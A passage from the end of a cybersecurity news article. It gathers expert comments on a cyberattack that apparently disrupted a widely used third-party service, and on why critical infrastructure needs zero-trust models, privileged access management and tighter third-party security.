RTX could not immediately be reached for comment by Dark Reading Monday morning.Critical Infrastructure Under AttackGiven the connectedness of Internet systems powering commonly used third-party software and services, security experts warned that similar incidents having a physical impact on people and their daily routines are likely to occur more and more, especially when critical services are targeted.""This event is a reminder that cyber-risk isn't abstract,"" Anne Cutler, cybersecurity evangelist at security firm Keeper Security, observed in an email to Dark Reading. ""It delays families, disrupts business, and erodes confidence in critical services. Attackers target interconnected environments precisely because of their reliance on third-party technology.""This means that modern critical infrastructure and essential service providers should tighten system security and improve visibility into every technology asset that affects their services to minimize impact on the people they serve, noted other experts.""Adversaries understand that targeting widely used technology services can result in outsized impact, as demonstrated in countless damaging supply-chain attacks,"" Darren Guccione, CEO and co-founder at Keeper Security, observed in a statement.Indeed, numerous security researchers have sounded the alarm on the current state of security of critical infrastructure, particularly when it comes to operational technology (OT), which requires shoring up. In fact, Dave Gerry, CEO at Bugcrowd, called critical infrastructure a ""soft target for cyber criminals"" that want to cause widespread disruption with minimal effort.""Whether nation-state actors looking to influence national interests or a criminal organization looking to cause mass panic and chaos, disruptions to services leveraged by millions represent a growing threat,"" he said.To meet this growing challenge, critical infrastructure providers should practice zero trust in their security models, as well as implement privileged access management solutions to minimize the impact of an attack and maintain public confidence in essential services, Guccione noted.Better preparedness for the inevitability of an attack through these principles, as well as maintaining a high bar for security for any third party that provides software or service to their systems, can also ""help contain the impact of any incident and keep essential services running even when attackers try to cause chaos,"" Cutler said.This story was updated at 1:00 p.m. ET on Sept. 22 to reflect new information about the attack and a statement from the ENISA."
